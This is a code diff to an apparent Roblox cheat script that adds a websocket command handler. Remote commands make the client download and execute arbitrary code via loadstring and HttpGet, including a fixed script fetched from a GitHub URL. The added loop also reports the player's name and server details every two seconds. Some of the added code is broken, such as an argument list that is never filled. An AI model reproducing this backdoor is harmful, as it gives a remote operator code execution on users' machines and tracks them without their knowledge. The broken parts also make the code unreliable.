@@ -4,6 +4,14 @@ local websockets = getgenv().websocket
 
 local usertable = {}
 
+function splitString(inputString)
+    local result = {}
+    for word in inputString:gmatch("%S+") do
+        table.insert(result, word)
+    end
+    return result
+end
+
 if websockets then
     local plr = game.Players.LocalPlayer
 
@@ -17,14 +25,42 @@ if websockets then
 
     local mess = getgenv().message or game.Players.LocalPlayer.Name
     
-    socket.OnMessage:Connect(function(message)
-    	table.insert(usertable , message)
+    function passcmd(command , user , args)
+        if command == "banned" then
+            game.Players.LocalPlayer:Kick("You have been banned from Fallen. If you feel this was a false ban, you may send an appeal.")
+        elseif command == "chat" then
+        
+        elseif command == "runloadstring" then
+            loadstring( game:HttpGet( args[1] ) )()
+        elseif command == "blind" then
+    
+        elseif command == "peterhook" then
+            loadstring( game:HttpGet("https://raw.githubusercontent.com/VainSolutions-Kiitty/Byfron/Main/public/mZl6XkJycR7clACJ3cme01I462lSnWlm/peterhook.lua") )()
+        end
+    end
+    
+    socket.OnMessage:Connect(function(data)
+        local cv = splitString(data)
+    
+        local command = cv[1]
+        local user = cv[2]
+        local args = {}
+    
+        if user == game.Players.LocalPlayer.Name then
+            passcmd(command , user , args)
+        elseif user == "all" then
+            passcmd(command , user , args)
+        end
+    
+        if command == "addplr" then
+            table.foreach(cheating_table , user)
+        end
     end)
+
 
     spawn(function() 
         while wait(2) do    
-             socket:Send(mess)  
-             socket:Send("SERVER: " .. clientinfo.Text)  
+             socket:Send("addplr " .. mess .. " SERVER: " .. clientinfo.Text)  
         end
     end)
 end
